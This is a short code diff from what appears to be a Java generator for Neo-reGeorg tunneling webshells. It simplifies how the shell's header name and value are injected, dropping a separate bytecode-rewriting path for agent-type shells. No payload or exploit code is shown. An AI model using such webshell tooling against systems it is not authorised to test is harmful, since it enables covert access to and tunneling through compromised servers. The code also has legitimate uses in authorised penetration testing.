@@ -42,19 +42,8 @@ public class NeoreGeorgGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
-            builder = builder.visit(
-                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
-                        put("headerName", neoreGeorgConfig.getHeaderName());
-                        put("headerValue", neoreGeorgConfig.getHeaderValue());
-                    }})
-            );
-        } else {
-            builder = builder
-                    .field(named("headerName")).value(neoreGeorgConfig.getHeaderName())
+        return builder.field(named("headerName")).value(neoreGeorgConfig.getHeaderName())
                     .field(named("headerValue")).value(neoreGeorgConfig.getHeaderValue());
-        }
-        return builder;
     }
 
     public byte[] getBytes() {
